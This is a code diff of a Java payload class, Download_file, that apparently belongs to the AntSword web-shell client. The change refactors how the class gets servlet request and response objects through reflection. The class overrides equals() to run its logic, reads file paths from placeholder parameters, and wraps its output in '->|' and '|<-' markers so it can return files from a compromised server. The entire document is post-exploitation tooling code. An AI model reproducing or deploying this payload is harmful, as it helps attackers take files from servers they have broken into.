@@ -3,51 +3,23 @@ package filemanager;
 import javax.servlet.ServletOutputStream;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.jsp.PageContext;
 import java.io.BufferedInputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.FileInputStream;
 import java.lang.reflect.Field;
 
 public class Download_file {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
-    public String encoder;
-    public String cs;
-    public String randomPrefix;
+    public String encoder = "base64";
+    public String cs = "antswordCharset";
+    public String randomPrefix = "antswordrandomPrefix";
     public String tag_s;
     public String tag_e;
 
     @Override
     public boolean equals(Object obj) {
-        try {
-            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception e) {
-            if (obj instanceof HttpServletRequest) {
-                request = (HttpServletRequest) obj;
-                try {
-                    Field req = request.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                    Field resp = request2.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception ex) {
-                    try {
-                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                    } catch (Exception ignored) {
-
-                    }
-                }
-            }
-        }
-        randomPrefix = "antswordrandomPrefix";
-        encoder = "base64";
-        cs = "antswordCharset";
-        StringBuffer output = new StringBuffer("");
-
+        this.parseObj(obj);
+        StringBuffer output = new StringBuffer();
         tag_s = "->|";
         tag_e = "|<-";
         String varkey1 = "antswordargpath";
@@ -65,6 +37,38 @@ public class Download_file {
         } catch (Exception ignored) {
         }
         return true;
+    }
+
+    public void parseObj(Object obj) {
+        if (obj.getClass().isArray()) {
+            Object[] data = (Object[]) obj;
+            request = (HttpServletRequest) data[0];
+            response = (HttpServletResponse) data[1];
+        } else {
+            try {
+                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+            } catch (Exception e) {
+                if (obj instanceof HttpServletRequest) {
+                    request = (HttpServletRequest) obj;
+                    try {
+                        Field req = request.getClass().getDeclaredField("request");
+                        req.setAccessible(true);
+                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                        Field resp = request2.getClass().getDeclaredField("response");
+                        resp.setAccessible(true);
+                        response = (HttpServletResponse) resp.get(request2);
+                    } catch (Exception ex) {
+                        try {
+                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                        } catch (Exception ignored) {
+
+                        }
+                    }
+                }
+            }
+        }
     }
 
     String decode(String str) throws Exception {
